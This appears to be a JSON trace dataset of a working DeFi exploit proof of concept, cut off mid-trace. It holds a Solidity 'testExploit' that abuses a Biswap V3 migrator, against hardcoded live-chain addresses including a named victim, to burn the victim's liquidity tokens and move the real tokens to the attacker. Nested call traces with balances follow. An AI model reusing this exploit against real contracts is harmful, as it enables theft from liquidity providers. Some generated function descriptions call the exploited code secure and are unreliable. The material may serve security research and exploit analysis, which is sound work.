@@ -1,0 +1,831 @@
+{
+  "logs": {
+    "calls": [
+      {
+        "id": "8602473",
+        "contract": "ContractTest",
+        "function": "testExploit",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        V3Migrator migrator = V3Migrator(0x839b0AFD0a0528ea184448E890cbaAFFD99C1dbf);\n        IUniswapV2Pair pairToMigrate = IUniswapV2Pair(0x63b30de1A998e9E64FD58A21F68D323B9BcD8F85);\n        address victimAddress = 0x2978D920a1655abAA315BAd5Baf48A2d89792618;\n\n        IBiswapFactoryV3 biswapV3 = IBiswapFactoryV3(0x7C3d53606f9c03e7f54abdDFFc3868E1C5466863);\n        //0. Preparations: create pool for fake tokens and transfer fake tokens to the migrator\n        FakeToken fakeToken0 = new FakeToken();\n        FakeToken fakeToken1 = new FakeToken();\n        FakePair fakePair = new FakePair();\n        biswapV3.newPool(address(fakeToken1), address(fakeToken0), 150, 1);\n        fakeToken0.transfer(address(migrator), 1e9 * 1e18);\n        fakeToken1.transfer(address(migrator), 1e9 * 1e18);\n\n        uint256 liquidityValue = pairToMigrate.balanceOf(victimAddress);\n        emit log_named_uint(\"liquidity to migrate\", liquidityValue);\n        IERC20 token0 = IERC20(pairToMigrate.token0());\n        IERC20 token1 = IERC20(pairToMigrate.token1());\n        assert(token0.balanceOf(address(this)) == 0);\n\n        //1. Burn victim's LP token and add liquidity with fake tokens\n        V3Migrator.MigrateParams memory params = V3Migrator.MigrateParams(\n            address(pairToMigrate),\n            liquidityValue,\n            address(fakeToken1),\n            address(fakeToken0),\n            150,\n            10_000,\n            20_000,\n            0,\n            0,\n            victimAddress,\n            block.timestamp + 1 minutes,\n            false\n        );\n        migrator.migrate(params);\n\n        uint256 token0Balance = token0.balanceOf(address(migrator));\n        uint256 token1Balance = token1.balanceOf(address(migrator));\n        fakePair.update(token0Balance, token1Balance);\n        emit log_named_decimal_uint(\"this token0 before\", token0.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"this token1 before\", token1.balanceOf(address(this)), 18);\n\n        //2. Steal tokens\n        fakePair.transfer(address(this), 1e9 * 1e18);\n        fakePair.approve(address(migrator), 1e9 * 1e18);\n        V3Migrator.MigrateParams memory params2 = V3Migrator.MigrateParams(\n            address(fakePair),\n            liquidityValue,\n            address(token0),\n            address(token1),\n            800,\n            10_000,\n            20_000,\n            0,\n            0,\n            address(this),\n            block.timestamp + 1 minutes,\n            false\n        );\n        migrator.migrate(params2);\n\n        assert(token0.balanceOf(address(this)) > 1e18);\n        emit log_named_decimal_uint(\"this token0 after\", token0.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"this token1 after\", token1.balanceOf(address(this)), 18);\n    }\n",
+        "description": "1. **Core functions:**  \n   The `testExploit` function is designed to simulate an attack scenario where it manipulates a migration process between two different versions of a decentralized exchange (Uniswap V2 to V3). It creates fake tokens and a fake trading pair, then uses these to trick the migration process into transferring real tokens from a victim's address to the attacker's address. The function essentially tests how the migration process can be exploited to steal funds.\n\n2. **Security mechanism:**  \n   The function does not include explicit security mechanisms to protect against malicious actions. Instead, it demonstrates how an attacker could bypass security measures. The use of `assert` statements is primarily for debugging and ensuring that certain conditions are met during the exploit, rather than providing security. The function lacks common security practices like access control or input validation, as it is intended to simulate an attack.\n\n3. **Parameter Function:**  \n   The function does not take any external parameters. However, it uses hardcoded addresses and values to set up the exploit. For example, it specifies the addresses of the migrator, the victim's trading pair, and the fake tokens. These parameters are crucial for the exploit to work, as they define the targets and the tools used in the attack.\n\n4. **Return description:**  \n   The function does not return any value. Instead, it uses `emit` statements to log specific values during the execution, such as the amount of liquidity being migrated and the balances of tokens before and after the exploit. These logs help to track the progress and success of the attack. The final `assert` statements ensure that the attacker has successfully stolen a significant amount of tokens.\n\n**In summary,**  \nThe `testExploit` function is a simulation of an attack that exploits a migration process to steal tokens. It uses fake tokens and a fake trading pair to manipulate the system and transfer funds from a victim to the attacker. The function does not include security measures, as it is designed to demonstrate vulnerabilities rather than protect against them. It logs key values during the process and ensures that the attack is successful through assertions.",
+        "return_value": "Returned",
+        "depth": 0,
+        "internal_calls": [
+          {
+            "id": "791481",
+            "contract": "→ new FakeToken@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f",
+            "function": "constructor",
+            "args": "",
+            "return_value": "3503 bytes of code",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "791481",
+            "contract": "→ new FakeToken@0x2e234DAe75C793f67A35089C9d99245E1C58470b",
+            "function": "constructor",
+            "args": "",
+            "return_value": "3503 bytes of code",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "838526",
+            "contract": "→ new FakePair@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a",
+            "function": "constructor",
+            "args": "",
+            "return_value": "3738 bytes of code",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "4512783",
+            "contract": "0x7C3d53606f9c03e7f54abdDFFc3868E1C5466863",
+            "function": "newPool",
+            "args": "FakeToken: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], FakeToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 150, 1",
+            "original_code": "    function newPool(\n        address tokenX,\n        address tokenY,\n        uint16 fee,\n        int24 currentPoint\n    ) external override noDelegateCall returns (address addr) {\n        require(tokenX != tokenY, \"SmTK\");\n        if (tokenX > tokenY) {\n            (tokenX, tokenY) = (tokenY, tokenX);\n        }\n        require(pool[tokenX][tokenY][fee] == address(0));\n        int24 pointDelta = fee2pointDelta[fee];\n\n        require(pointDelta > 0, 'pd');\n        // now creating\n        bytes32 salt = keccak256(abi.encode(tokenX, tokenY, fee));\n\n        deployPoolParams = DeployPoolParams({\n            tokenX: tokenX,\n            tokenY: tokenY,\n            fee: fee,\n            currentPoint: currentPoint,\n            pointDelta: pointDelta,\n            feeChargePercent: defaultFeeChargePercent\n        });\n\n        addr = DeployPool.deployPool(salt);\n        delete deployPoolParams;\n\n        pool[tokenX][tokenY][fee] = addr;\n        pool[tokenY][tokenX][fee] = addr;\n        emit NewPool(tokenX, tokenY, fee, uint24(pointDelta), addr);\n    }\n\n    /// @inheritdoc IBiswapFactoryV3\n",
+            "description": "1. Core functions:  \nThe `newPool` function is designed to create a new pool for trading two tokens (`tokenX` and `tokenY`) with a specified fee and a starting point for trading. It ensures that the tokens are different, sorts them to avoid duplication, and checks if a pool with the same configuration already exists. If all conditions are met, it deploys a new pool using a unique identifier (salt) and stores the pool's address in a mapping for future reference. Finally, it emits an event to notify that a new pool has been created.\n\n2. Security mechanism:  \n- **`noDelegateCall` modifier**: Prevents the function from being called indirectly through another contract, ensuring it runs directly in the intended context.  \n- **`require` statements**:  \n  - Ensures `tokenX` and `tokenY` are different to avoid invalid pools.  \n  - Checks if a pool with the same configuration already exists to prevent duplication.  \n  - Validates that the `pointDelta` (a derived value from the fee) is greater than zero to ensure proper pool setup.  \n- **Sorting tokens**: Swaps `tokenX` and `tokenY` if necessary to maintain consistency in the pool mapping.  \n- **Deletion of `deployPoolParams`**: Clears temporary deployment parameters after use to avoid potential misuse or errors.  \n\n3. Parameter Function:  \n- **`tokenX` and `tokenY`**: The addresses of the two tokens to be traded in the new pool.  \n- **`fee`**: The fee percentage applied to trades in the pool.  \n- **`currentPoint`**: The starting point for trading in the pool, which represents the initial price or position.  \nThese parameters define the configuration of the new pool and ensure it is unique and properly set up.\n\n4. Return description:  \nThe function returns the address (`addr`) of the newly created pool. This address is generated by deploying a new pool contract using a unique identifier (`salt`) derived from the token addresses and fee. The address is then stored in a mapping for both token pairs to ensure easy access and consistency.\n\nIn summary,  \nThe `newPool` function creates a new trading pool for two tokens with a specified fee and starting point. It ensures security by preventing duplicate pools, validating inputs, and using a direct call context. The function returns the address of the newly created pool, which is stored for future use.",
+            "return_value": "0x7fa10ad1414b8c455Af2F802da50AAB40e8af530",
+            "depth": 1,
+            "internal_calls": [
+              {
+                "id": "4409729",
+                "contract": "0xD0BF3340E9d355f82142bf9314Bce98d9F9010Fb",
+                "function": "deployPool",
+                "value": null,
+                "args": "0xc262d2e72982020837249b8c2527aba38f8c03ca756d83e2e2ec068dc8ccd576",
+                "return_value": "0x0000000000000000000000007fa10ad1414b8c455af2f802da50aab40e8af530",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "4365988",
+                    "contract": "→ new <unknown>@0x7fa10ad1414b8c455Af2F802da50AAB40e8af530",
+                    "function": "constructor",
+                    "args": "",
+                    "return_value": "20040 bytes of code",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "765",
+                        "contract": "0x7C3d53606f9c03e7f54abdDFFc3868E1C5466863",
+                        "function": "deployPoolParams",
+                        "value": null,
+                        "args": "",
+                        "return_value": "0x0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000000000000096000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000014",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "10982",
+                        "contract": "0x7C3d53606f9c03e7f54abdDFFc3868E1C5466863",
+                        "function": "addresses",
+                        "value": null,
+                        "args": "",
+                        "return_value": "0x00000000000000000000000032694a9908c74cfe13be56bff181bd2578c325d2000000000000000000000000ec76a8f55cdfae41fa5cd4e7778be70aca7d89b2000000000000000000000000cbc519bbd6e48061641ac2c332d050fc673e44a100000000000000000000000036b425f04ae1f5242df22f3a560bcfab40451cdc0000000000000000000000005af171610859ccc643f2cc7459f7b904c11dadfe",
+                        "depth": 4,
+                        "internal_calls": []
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "id": "23630",
+            "contract": "FakeToken",
+            "function": "transfer",
+            "args": "0x839b0AFD0a0528ea184448E890cbaAFFD99C1dbf, 1000000000000000000000000000 [1e27]",
+            "original_code": "    function transfer(address to, uint value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
+            "description": "1. **Core functions:**\n   - The `transfer` function allows the sender to move a specified amount of tokens to another address. It directly calls the internal `_transfer` function to execute the transfer.\n   - The `transferFrom` function enables a third party (with approval) to transfer tokens from one address to another. It checks if the sender has sufficient allowance and then reduces the allowance before executing the transfer via the `_transfer` function.\n\n2. **Security mechanism:**\n   - Both functions are marked as `external`, meaning they can only be called from outside the contract, ensuring controlled access.\n   - The `transferFrom` function includes a check to ensure the sender has sufficient allowance (permission) to transfer tokens on behalf of the owner. If the allowance is not unlimited (`uint(-1)`), it subtracts the transferred amount from the allowance to prevent overuse.\n   - The `sub` function (likely from a safe math library) is used to handle arithmetic operations safely, preventing overflow or underflow issues.\n\n3. **Parameter Function:**\n   - For `transfer`: \n     - `to`: The address receiving the tokens.\n     - `value`: The amount of tokens to be transferred.\n   - For `transferFrom`:\n     - `from`: The address from which tokens are being transferred.\n     - `to`: The address receiving the tokens.\n     - `value`: The amount of tokens to be transferred.\n\n4. **Return description:**\n   - Both functions return `true` to indicate that the transfer was successful. This is a standard practice in ERC-20 token contracts to signal the completion of the operation.\n\nIn summary, these functions facilitate token transfers in a secure and controlled manner, ensuring that only authorized parties can move tokens and that allowances are properly managed.",
+            "return_value": "true",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "23630",
+            "contract": "FakeToken",
+            "function": "transfer",
+            "args": "0x839b0AFD0a0528ea184448E890cbaAFFD99C1dbf, 1000000000000000000000000000 [1e27]",
+            "flag": 1,
+            "return_value": "true",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "2502",
+            "contract": "0x63b30de1A998e9E64FD58A21F68D323B9BcD8F85",
+            "function": "balanceOf",
+            "args": "0x2978D920a1655abAA315BAd5Baf48A2d89792618",
+            "original_code": "",
+            "description": "",
+            "return_value": "1094357092264218434277 [1.094e21]",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "2403",
+            "contract": "0x63b30de1A998e9E64FD58A21F68D323B9BcD8F85",
+            "function": "token0",
+            "value": null,
+            "args": "",
+            "return_value": "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "2424",
+            "contract": "0x63b30de1A998e9E64FD58A21F68D323B9BcD8F85",
+            "function": "token1",
+            "value": null,
+            "args": "",
+            "return_value": "0x55d398326f99059fF775485246999027B3197955",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "2531",
+            "contract": "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",
+            "function": "balanceOf",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+            "flag": 1,
+            "return_value": "0",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "915773",
+            "contract": "0x839b0AFD0a0528ea184448E890cbaAFFD99C1dbf",
+            "function": "migrate",
+            "args": "MigrateParams({ pair: 0x63b30de1A998e9E64FD58A21F68D323B9BcD8F85, liquidityToMigrate: 1094357092264218434277 [1.094e21], token0: 0x2e234DAe75C793f67A35089C9d99245E1C58470b, token1: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, fee: 150, tickLower: 10000 [1e4], tickUpper: 20000 [2e4], amount0Min: 0, amount1Min: 0, recipient: 0x2978D920a1655abAA315BAd5Baf48A2d89792618, deadline: 1688130693 [1.688e9], refundAsETH: false }",
+            "original_code": "    function migrate(MigrateParams calldata params) external override returns(uint refund0, uint refund1){\n\n        // burn v2 liquidity to this address\n        IBiswapPair(params.pair).transferFrom(params.recipient, params.pair, params.liquidityToMigrate);\n        (uint256 amount0V2, uint256 amount1V2) = IBiswapPair(params.pair).burn(address(this));\n\n        // calculate the amounts to migrate to v3\n        uint128 amount0V2ToMigrate = uint128(amount0V2);\n        uint128 amount1V2ToMigrate = uint128(amount1V2);\n\n        // approve the position manager up to the maximum token amounts\n        safeApprove(params.token0, liquidityManager, amount0V2ToMigrate);\n        safeApprove(params.token1, liquidityManager, amount1V2ToMigrate);\n\n        // mint v3 position\n        (, , uint256 amount0V3, uint256 amount1V3) = ILiquidityManager(liquidityManager).mint(\n            ILiquidityManager.MintParam({\n                miner: params.recipient,\n                tokenX: params.token0,\n                tokenY: params.token1,\n                fee: params.fee,\n                pl: params.tickLower,\n                pr: params.tickUpper,\n                xLim: amount0V2ToMigrate,\n                yLim: amount1V2ToMigrate,\n                amountXMin: params.amount0Min,\n                amountYMin: params.amount1Min,\n                deadline: params.deadline\n            })\n        );\n\n        // if necessary, clear allowance and refund dust\n        if (amount0V3 < amount0V2) {\n            if (amount0V3 < amount0V2ToMigrate) {\n                safeApprove(params.token0, liquidityManager, 0);\n            }\n\n            refund0 = amount0V2 - amount0V3;\n            if (params.refundAsETH && params.token0 == WETH9) {\n                IWETH9(WETH9).withdraw(refund0);\n                safeTransferETH(params.recipient, refund0);\n            } else {\n                safeTransfer(params.token0, params.recipient, refund0);\n            }\n        }\n        if (amount1V3 < amount1V2) {\n            if (amount1V3 < amount1V2ToMigrate) {\n                safeApprove(params.token1, liquidityManager, 0);\n            }\n\n            refund1 = amount1V2 - amount1V3;\n            if (params.refundAsETH && params.token1 == WETH9) {\n                IWETH9(WETH9).withdraw(refund1);\n                safeTransferETH(params.recipient, refund1);\n            } else {\n                safeTransfer(params.token1, params.recipient, refund1);\n            }\n        }\n\n        emit Migrate(\n            params,\n            amount0V2,\n            amount1V2,\n            amount0V3,\n            amount1V3\n        );\n    }\n\n",
+            "description": "1. **Core functions:**  \n   The `migrate` function is designed to move liquidity from one version (v2) of a decentralized exchange (DEX) to another version (v3). It does this by burning the v2 liquidity tokens, converting the resulting assets into v3 liquidity, and handling any leftover amounts as refunds. The function ensures a smooth transition of funds between the two versions while managing approvals and transfers securely.\n\n2. **Security mechanism:**  \n   - **`external` modifier:** Ensures the function can only be called from outside the contract, preventing internal misuse.  \n   - **`override` modifier:** Indicates that this function is overriding a function from a parent contract or interface.  \n   - **`safeApprove` and `safeTransfer`:** These are custom functions (not shown in the code) that safely handle token approvals and transfers, reducing the risk of errors or vulnerabilities.  \n   - **Refund handling:** The function checks for leftover amounts after migration and refunds them to the recipient, either as tokens or ETH, depending on the user's preference.  \n   - **Allowance clearing:** After migration, the function clears any unused token allowances to prevent potential misuse of approvals.  \n\n3. **Parameter Function:**  \n   The function takes a single parameter, `params`, which is a structured data type (`MigrateParams`) containing all the necessary details for the migration process. These details include:  \n   - `pair`: The v2 liquidity pool address.  \n   - `recipient`: The address receiving the v3 liquidity and any refunds.  \n   - `liquidityToMigrate`: The amount of v2 liquidity to migrate.  \n   - `token0` and `token1`: The two tokens in the liquidity pool.  \n   - `fee`, `tickLower`, `tickUpper`: Parameters for the v3 liquidity position.  \n   - `amount0Min` and `amount1Min`: Minimum amounts of tokens required for the migration.  \n   - `deadline`: The time limit for the transaction to be valid.  \n   - `refundAsETH`: A flag indicating whether refunds should be sent as ETH.  \n\n4. **Return description:**  \n   The function returns two values, `refund0` and `refund1`, which represent the leftover amounts of the two tokens after the migration. These refunds are calculated by subtracting the amounts used in the v3 migration (`amount0V3` and `amount1V3`) from the original amounts obtained by burning the v2 liquidity (`amount0V2` and `amount1V2`). If there are leftovers, they are either sent back to the recipient as tokens or converted to ETH, depending on the `refundAsETH` parameter.  \n\n**In summary,**  \nThe `migrate` function facilitates the transfer of liquidity from a v2 DEX to a v3 DEX. It handles burning v2 tokens, creating v3 positions, and managing refunds securely. The function ensures that all approvals and transfers are safe and that any leftover amounts are returned to the user efficiently.",
+            "return_value": "3598, 53553740618437724760070 [5.355e22]",
+            "depth": 1,
+            "internal_calls": [
+              {
+                "id": "33449",
+                "contract": "0x63b30de1A998e9E64FD58A21F68D323B9BcD8F85",
+                "function": "transferFrom",
+                "args": "0x2978D920a1655abAA315BAd5Baf48A2d89792618, 0x63b30de1A998e9E64FD58A21F68D323B9BcD8F85, 1094357092264218434277 [1.094e21]",
+                "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    /// @notice Event emitted when tokens are transferred from one address to another, either via `#transfer` or `#transferFrom`.\n    /// @param from The account from which the tokens were sent, i.e. the balance decreased\n    /// @param to The account to which the tokens were sent, i.e. the balance increased\n    /// @param value The amount of tokens that were transferred\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /// @notice Event emitted when the approval amount for the spender of a given owner's tokens changes.\n    /// @param owner The account that approved spending of its tokens\n    /// @param spender The account for which the spending allowance was modified\n    /// @param value The new allowance from the owner to the spender\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n}\n",
+                "description": "1. **Core functions**:  \n   The `transferFrom` function is designed to move a specific amount of tokens from one account (`sender`) to another (`recipient`). This function is typically used when a third party (like a smart contract or another user) has been given permission to manage tokens on behalf of the `sender`. It ensures that tokens can be transferred without the `sender` directly initiating the transaction.\n\n2. **Security mechanism**:  \n   The function is marked as `external`, meaning it can only be called from outside the contract, ensuring internal state changes are controlled. Additionally, the function relies on an approval mechanism, where the `sender` must first approve the caller to spend a certain amount of tokens. This prevents unauthorized transfers. The `Transfer` event is emitted to log the transaction, providing transparency and traceability.\n\n3. **Parameter Function**:  \n   - `sender`: The address of the account from which tokens are being transferred.  \n   - `recipient`: The address of the account receiving the tokens.  \n   - `amount`: The number of tokens to be transferred.  \n\n   These parameters define the source, destination, and quantity of the token transfer, ensuring the function operates correctly and securely.\n\n4. **Return description**:  \n   The function returns a boolean value (`true` or `false`) to indicate whether the transfer was successful. If the transfer is completed without issues, it returns `true`. If there are problems (e.g., insufficient balance or lack of approval), it returns `false`.\n\nIn summary, the `transferFrom` function allows a third party to transfer tokens on behalf of a user, provided they have prior approval. It uses security measures like external access control and event logging to ensure safe and transparent transactions. The parameters specify the transfer details, and the return value confirms the success or failure of the operation.",
+                "return_value": "true",
+                "depth": 2,
+                "internal_calls": []
+              },
+              {
+                "id": "142528",
+                "contract": "0x63b30de1A998e9E64FD58A21F68D323B9BcD8F85",
+                "function": "burn",
+                "args": "0x839b0AFD0a0528ea184448E890cbaAFFD99C1dbf",
+                "original_code": "    function burn(\n        int24 leftPt,\n        int24 rightPt,\n        uint128 liquidDelta\n    ) external override noDelegateCall lock returns (uint256 amountX, uint256 amountY) {\n        (bool success, bytes memory d) = liquidityModule.delegatecall(\n            abi.encodeWithSelector(0xa34123a7, leftPt, rightPt, liquidDelta)//\"burn(int24,int24,uint128)\"\n        );\n        if (success) {\n            (amountX, amountY) = abi.decode(d, (uint256, uint256));\n            emit Burn(msg.sender, leftPt, rightPt, liquidDelta, amountX, amountY, getStateEvent());\n        } else {\n            revertDCData(d);\n        }\n    }\n\n    /// @inheritdoc IBiswapPoolV3\n",
+                "description": "1. Core functions:  \nThe `burn` function is designed to reduce or \"burn\" a specific amount of liquidity (`liquidDelta`) within a defined range (`leftPt` and `rightPt`) in a decentralized exchange pool. This operation adjusts the available liquidity in the pool, which can impact trading conditions. The function also calculates and returns the amounts of two tokens (`amountX` and `amountY`) that are removed from the pool as a result of this liquidity reduction.\n\n2. Security mechanism:  \nThe function includes two key security measures:  \n- `noDelegateCall`: This ensures the function cannot be called indirectly through another contract, preventing potential misuse or attacks.  \n- `lock`: This modifier prevents reentrancy attacks by locking the function during execution, ensuring it cannot be interrupted or called again until it completes.  \n\n3. Parameter Function:  \n- `leftPt` and `rightPt`: These define the range within the pool where the liquidity is being reduced. They act as boundaries for the operation.  \n- `liquidDelta`: This specifies the amount of liquidity to be removed or \"burned\" from the pool.  \n\n4. Return description:  \nThe function returns two values, `amountX` and `amountY`, which represent the quantities of the two tokens removed from the pool due to the liquidity reduction. These values are calculated by the `liquidityModule` through a delegated call, ensuring the logic is handled securely and efficiently.  \n\nIn summary, the `burn` function reduces liquidity in a specific range of a decentralized exchange pool, calculates the corresponding token amounts removed, and ensures secure execution through modifiers like `noDelegateCall` and `lock`.",
+                "return_value": "28149267765302306856 [2.814e19], 53553740618437724760070 [5.355e22]",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "2531",
+                    "contract": "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",
+                    "function": "balanceOf",
+                    "args": "0x63b30de1A998e9E64FD58A21F68D323B9BcD8F85",
+                    "flag": 1,
+                    "return_value": "1838704074123228894540 [1.838e21]",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "2531",
+                    "contract": "0x55d398326f99059fF775485246999027B3197955",
+                    "function": "balanceOf",
+                    "args": "0x63b30de1A998e9E64FD58A21F68D323B9BcD8F85",
+                    "flag": 1,
+                    "return_value": "3498118739025842188068311 [3.498e24]",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "2337",
+                    "contract": "0x858E3312ed3A876947EA49d572A7C42DE08af7EE",
+                    "function": "feeTo",
+                    "value": null,
+                    "args": "",
+                    "return_value": "0x612e072e433A8a08496Ee0714930b357426c12Ce",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "27971",
+                    "contract": "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",
+                    "function": "transfer",
+                    "args": "0x839b0AFD0a0528ea184448E890cbaAFFD99C1dbf, 28149267765302306856 [2.814e19]",
+                    "flag": 1,
+                    "return_value": "true",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "27971",
+                    "contract": "0x55d398326f99059fF775485246999027B3197955",
+                    "function": "transfer",
+                    "args": "0x839b0AFD0a0528ea184448E890cbaAFFD99C1dbf, 53553740618437724760070 [5.355e22]",
+                    "flag": 1,
+                    "return_value": "true",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "531",
+                    "contract": "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",
+                    "function": "balanceOf",
+                    "args": "0x63b30de1A998e9E64FD58A21F68D323B9BcD8F85",
+                    "flag": 1,
+                    "return_value": "1810554806357926587684 [1.81e21]",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "531",
+                    "contract": "0x55d398326f99059fF775485246999027B3197955",
+                    "function": "balanceOf",
+                    "args": "0x63b30de1A998e9E64FD58A21F68D323B9BcD8F85",
+                    "flag": 1,
+                    "return_value": "3444564998407404463308241 [3.444e24]",
+                    "depth": 3,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "23226",
+                "contract": "FakeToken",
+                "function": "approve",
+                "args": "0x24Ba8d2A15Fe60618039c398Cf9FD093b1C1FEB5, 28149267765302306856 [2.814e19]",
+                "original_code": "    function approve(address spender, uint value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n",
+                "description": "1. **Core functions**:  \n   The `approve` function allows the owner of tokens (the caller) to authorize another address (the `spender`) to spend a specific amount of tokens (`value`) on their behalf. This is a common function in token contracts to enable delegated spending.\n\n2. **Security mechanism**:  \n   - The function uses the `external` modifier, which ensures it can only be called from outside the contract.  \n   - It relies on the `msg.sender` to identify the caller, ensuring only the token owner can approve spending.  \n   - The function internally calls `_approve`, which typically includes additional checks to prevent unauthorized or invalid approvals.  \n\n3. **Parameter Function**:  \n   - `spender`: The address of the account that is being authorized to spend tokens.  \n   - `value`: The maximum amount of tokens the spender is allowed to spend.  \n\n4. **Return description**:  \n   The function always returns `true` to indicate that the approval operation was successful. This is a standard practice for such functions to confirm the action has been completed.  \n\nIn summary, the `approve` function enables token owners to delegate spending rights to another address, ensuring proper authorization and returning a confirmation of success.",
+                "return_value": "true",
+                "depth": 2,
+                "internal_calls": []
+              },
+              {
+                "id": "23226",
+                "contract": "FakeToken",
+                "function": "approve",
+                "args": "0x24Ba8d2A15Fe60618039c398Cf9FD093b1C1FEB5, 53553740618437724760070 [5.355e22]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 2,
+                "internal_calls": []
+              },
+              {
+                "id": "621279",
+                "contract": "0x24Ba8d2A15Fe60618039c398Cf9FD093b1C1FEB5",
+                "function": "mint",
+                "value": null,
+                "args": "(0x2978D920a1655abAA315BAd5Baf48A2d89792618, 0x2e234DAe75C793f67A35089C9d99245E1C58470b, 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, 150, 10000 [1e4], 20000 [2e4], 28149267765302306856 [2.814e19], 53553740618437724760070 [5.355e22], 0, 0, 1688130693 [1.688e9]",
+                "return_value": "0x00000000000000000000000000000000000000000000000000000000000005e70000000000000000000000000000000000000000000000000014f37bb9688d4f00000000000000000000000000000000000000000000000186a649e42e329a1a0000000000000000000000000000000000000000000000000000000000000000",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "874",
+                    "contract": "0x7C3d53606f9c03e7f54abdDFFc3868E1C5466863",
+                    "function": "pool",
+                    "value": null,
+                    "args": "FakeToken: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], FakeToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 150",
+                    "return_value": "0x0000000000000000000000007fa10ad1414b8c455af2f802da50aab40e8af530",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "373",
+                    "contract": "0x7fa10ad1414b8c455Af2F802da50AAB40e8af530",
+                    "function": "sqrtRate_96",
+                    "value": null,
+                    "args": "",
+                    "return_value": "0x0000000000000000000000000000000000000001000346d6ff11672ae55ad010",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "1136",
+                    "contract": "0x7fa10ad1414b8c455Af2F802da50AAB40e8af530",
+                    "function": "state",
+                    "value": null,
+                    "args": "",
+                    "return_value": "0x0000000000000000000000000000000000000001000346d6ff11672ae55ad010000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "311016",
+                    "contract": "0x7fa10ad1414b8c455Af2F802da50AAB40e8af530",
+                    "function": "mint",
+                    "value": null,
+                    "args": "0x24Ba8d2A15Fe60618039c398Cf9FD093b1C1FEB5, 10000 [1e4], 20000 [2e4], 5897212251376975 [5.897e15], 150, 0x0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000000000000096000000000000000000000000839b0afd0a0528ea184448e890cbaaffd99c1dbf",
+                    "return_value": "0x00000000000000000000000000000000000000000000000186a649e42e329a1a0000000000000000000000000000000000000000000000000000000000000000",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "299131",
+                        "contract": "0xcbC519bBD6e48061641Ac2c332D050FC673e44a1",
+                        "function": "mint",
+                        "value": null,
+                        "args": "0x24Ba8d2A15Fe60618039c398Cf9FD093b1C1FEB5, 10000 [1e4], 20000 [2e4], 5897212251376975 [5.897e15], 150, 0x0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000000000000096000000000000000000000000839b0afd0a0528ea184448e890cbaaffd99c1dbf",
